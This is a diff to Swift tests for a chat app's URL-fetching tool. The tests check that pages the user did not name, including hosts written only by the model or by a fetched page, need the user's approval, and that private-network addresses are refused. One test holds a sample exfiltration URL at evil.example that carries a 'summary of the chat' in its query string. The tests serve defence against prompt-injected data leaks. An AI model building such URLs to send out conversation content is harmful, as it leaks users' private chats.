@@ -64,7 +64,7 @@ struct FetchToolTests {
 
         rig.store.setFetchesPages(true)
         #expect(rig.reopened().fetchesPages)
-        rig.store.send("hi again")
+        rig.store.send("hi again, from \(server.host)")
         await untilIdle(rig.store)
         let body = try #require(server.chats.last)
         let function = try #require((body["tools"] as? [[String: Any]])?.first?["function"] as? [String: Any])
@@ -88,7 +88,7 @@ struct FetchToolTests {
         #expect(offeredTools(try #require(server.chats.last)).sorted() == ["Fake_fetch_url", "get_me"])
 
         store.setFetchesPages(true)
-        store.send("on")
+        store.send("on, for \(server.host)")
         await untilIdle(store)
         #expect(offeredTools(try #require(server.chats.last)).sorted() == ["Fake_fetch_url", "fetch_url", "get_me"])
     }
@@ -105,7 +105,7 @@ struct FetchToolTests {
         let all = messages(store)
         #expect(all.map(\.role) == [.user, .assistant, .assistant])
         let call = try #require(all[1].toolCalls.first)
-        #expect(call.name == "fetch_url" && call.server == server.host, "the row shows the host")
+        #expect(call.name == "fetch_url" && call.server == address, "the row shows the whole address")
         #expect(call.result?.isError == false)
         let text = "Title: Hello Page\nURL: \(address)\n\nHello\n\nThe answer is 42."
         #expect(call.result?.text == text)
@@ -183,7 +183,7 @@ struct FetchToolTests {
         let all = messages(store)
         let result = try #require(all[1].toolCalls.first?.result)
         #expect(result.isError && result.text == "192.168.1.1 is on this device or a private network, so it can't be fetched.")
-        #expect(all[1].toolCalls.first?.server == "192.168.1.1")
+        #expect(all[1].toolCalls.first?.server == "http://192.168.1.1/admin")
         #expect(all.last?.content == "done: \(result.text)")
         #expect(server.pageRequests.isEmpty)
         #expect(store.exchanges(for: all[1].id).allSatisfy { $0.purpose != .fetch })
@@ -199,5 +199,103 @@ struct FetchToolTests {
 
         let result = try #require(messages(store)[1].toolCalls.first?.result)
         #expect(result.isError && result.text.hasPrefix("That isn't a web address."))
+    }
+
+    // MARK: Addresses the user did not give
+
+    /// True once the reply stops to ask, false when it ends without asking.
+    private func untilAsking(_ store: ChatStore) async -> Bool {
+        while store.isBusy {
+            if store.awaitingApproval != nil { return true }
+            try? await Task.sleep(for: .milliseconds(5))
+        }
+        return false
+    }
+
+    /// Waits until the reply ends or stops to ask.
+    private func untilIdleOrAsking(_ store: ChatStore) async {
+        while store.isBusy, store.awaitingApproval == nil { try? await Task.sleep(for: .milliseconds(5)) }
+    }
+
+    @Test(arguments: [false, true], [WireAPI.chatCompletions, .responses])
+    func aPageTheUserDidNotNameIsReadOnlyAfterTheyAllowIt(allow: Bool, api: WireAPI) async throws {
+        let server = model()
+        let (store, cleanup) = fetchingStore(server, api: api)
+        defer { cleanup() }
+        let address = server.pageURL().absoluteString
+
+        store.send("read the docs for me")
+        try #require(await untilAsking(store), "it should have asked first")
+        #expect(store.awaitingApproval == "call_1")
+        #expect(server.pageRequests.isEmpty, "nothing is read before the user answers")
+        let asking = try #require(store.liveReply?.toolCalls.first)
+        #expect(asking.server == address, "the prompt can show the whole address")
+        store.resolveApproval(allow)
+        await untilIdle(store)
+
+        let result = try #require(messages(store)[1].toolCalls.first?.result)
+        #expect(result.isError == !allow)
+        #expect(server.pageRequests.count == (allow ? 1 : 0))
+        if allow {
+            #expect(result.text == "Title: Hello Page\nURL: \(address)\n\nHello\n\nThe answer is 42.")
+        } else {
+            #expect(result.text == "The user declined to read this address.")
+            #expect(store.exchanges(for: messages(store)[1].id).allSatisfy { $0.purpose != .fetch })
+        }
+        #expect(messages(store).last?.content == "done: \(result.text)", "the model got the answer")
+        #expect(store.awaitingApproval == nil && store.failedReply == nil)
+    }
+
+    @Test func aHostFromAnEarlierMessageOfTheChatIsNotAskedAboutAgain() async throws {
+        let server = model()
+        let (store, cleanup) = fetchingStore(server)
+        defer { cleanup() }
+
+        store.send("Read \(server.pageURL().absoluteString)")
+        await untilIdleOrAsking(store)
+        store.send("and once more, please")
+        await untilIdleOrAsking(store)
+
+        #expect(store.awaitingApproval == nil)
+        #expect(server.pageRequests.count == 2)
+        #expect(messages(store).map(\.role) == [.user, .assistant, .assistant, .user, .assistant, .assistant])
+    }
+
+    @Test func aHostOnlyAModelOrAPageWroteIsNotOneTheUserGave() async throws {
+        let server = model()
+        let (store, cleanup) = fetchingStore(server)
+        defer { cleanup() }
+        store.newConversation()
+        store.conversations[0].messages = [ChatMessage(role: .assistant, content: "Try \(server.host)",
+                                                       toolCalls: [ToolCall(id: "c", name: "fetch_url", arguments: "{}", result: .init(text: "see \(server.host)"))])]
+
+        store.send("read it")
+        try #require(await untilAsking(store), "it should have asked first")
+        store.resolveApproval(false)
+        await untilIdle(store)
+        #expect(server.pageRequests.isEmpty)
+    }
+
+    @Test func stoppingWhileAskingToReadAPageDeclinesIt() async throws {
+        let server = model()
+        let (store, cleanup) = fetchingStore(server)
+        defer { cleanup() }
+
+        store.send("read the docs for me")
+        try #require(await untilAsking(store), "it should have asked first")
+        store.stop()
+        await untilIdle(store)
+        #expect(store.awaitingApproval == nil && server.pageRequests.isEmpty)
+    }
+
+    @Test func theQuestionNamesTheWholeAddressInPlainWords() {
+        let long = "https://evil.example/collect?q=" + String(repeating: "summary of the chat ", count: 20)
+        let call = ToolCall(id: "c", name: "fetch_url", arguments: Self.arguments(long), server: long)
+        let ask = call.approval
+        #expect(ask.question == "The model wants to read a page you didn't mention. Read it?")
+        #expect(ask.address == long, "never shortened, since the end of an address is where a chat could be hidden")
+
+        let other = ToolCall(id: "c", name: "create_issue", arguments: "{}", server: "GitHub").approval
+        #expect(other.question == "This tool can make changes. Run it?" && other.address == nil)
     }
 }
